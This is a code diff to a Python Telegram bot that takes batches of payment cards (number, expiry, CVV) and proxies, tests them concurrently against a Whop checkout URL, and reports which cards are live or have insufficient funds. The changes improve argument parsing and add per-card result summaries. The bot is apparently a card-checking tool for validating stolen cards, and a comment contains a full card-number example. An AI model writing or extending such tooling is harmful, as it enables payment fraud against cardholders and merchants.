@@ -83,6 +83,15 @@ def get_db():
     return _db if _db is not None else load_db()
 
 
+def cmd_args(m):
+    """Text that follows a command, whether on the same line (after a space)
+    or on the following lines. e.g. '/addproxy\\nuser:pass@host:port' works."""
+    s = m.text.split(" ", 1)
+    if len(s) > 1 and s[1].strip():
+        return s[1]
+    return "\n".join(m.text.splitlines()[1:])
+
+
 # ---------- helpers ----------
 def parse_ccs(text):
     out = []
@@ -229,17 +238,25 @@ def run_check(chat_id, url, proxy_list, ccs_override=None):
         return cc, res
 
     futures = [ex.submit(worker, cc, i) for i, cc in enumerate(target)]
+    paired = []
     for f in futures:
         cc, res = f.result()
         record_result(cc, res)
         send_result(chat_id, res)
+        paired.append((cc, res))
     ex.shutdown(wait=False)
 
-    hits = sum(1 for c in db["ccs"] if c.get("live"))
-    ins = sum(1 for c in db["ccs"] if c.get("status") == "insufficient")
+    icon = {"success": "✅", "insufficient": "⚠️", "declined": "⛔",
+            "missing": "❓", "error": "💥"}
+    lines = [f"{icon.get(r['status'],'ℹ️')} `…{r['last4']}` {r['status'].upper()}"
+             for _, r in paired]
+    hits = sum(1 for _, r in paired if r["status"] == "success")
+    ins = sum(1 for _, r in paired if r["status"] == "insufficient")
     bot.send_message(
         chat_id,
-        f"✦ done · ✅{hits} live · ⚠️{ins} insufficient · use /live to retry insufficient")
+        "✦ *Results*\n" + "\n".join(lines) +
+        f"\n\n✦ ✅{hits} live · ⚠️{ins} insufficient · use /live to retry",
+        parse_mode="Markdown")
 
 
 # ---------- database view ----------
@@ -312,7 +329,7 @@ def cmd_start(m):
 
 @bot.message_handler(commands=["ccs"])
 def cmd_ccs(m):
-    text = m.text.split(" ", 1)[1] if " " in m.text else ""
+    text = cmd_args(m)
     if not text.strip():
         bot.send_message(m.chat.id,
                          "✦ send: /ccs then cards one per line\n`num|mm|yyyy|cvv`",
@@ -350,7 +367,7 @@ def cmd_proxy(m):
 
 @bot.message_handler(commands=["addproxy"])
 def cmd_addproxy(m):
-    text = m.text.split(" ", 1)[1] if " " in m.text else ""
+    text = cmd_args(m)
     if not text.strip():
         bot.send_message(m.chat.id, "✦ /addproxy `user:pass@host:port`",
                          parse_mode="Markdown")
@@ -360,20 +377,22 @@ def cmd_addproxy(m):
 
 @bot.message_handler(commands=["whop"])
 def cmd_whop(m):
-    lines = m.text.splitlines()
-    arg = lines[0].split(" ", 1)
-    if len(arg) < 2 or not arg[1].strip().startswith("http"):
+    body = cmd_args(m)
+    blines = body.splitlines()
+    url_line = next((l.strip() for l in blines if l.strip().startswith("http")), None)
+    if not url_line:
         bot.send_message(m.chat.id, "✦ /whop `<checkout url>`",
                          parse_mode="Markdown")
         return
-    url = arg[1].strip()
+    url = url_line
     db = get_db()
     # allow pasting cards on the following lines, e.g.
     #   /whop <url>
     #   5328398287077228|05|2029|211
+    card_text = "\n".join(l for l in blines if not l.strip().startswith("http"))
     added = 0
-    if len(lines) > 1:
-        new = parse_ccs("\n".join(lines[1:]))
+    if card_text.strip():
+        new = parse_ccs(card_text)
         room = 50 - len(db["ccs"])
         for c in new[:room]:
             c.update({"status": "", "live": False, "response": "",
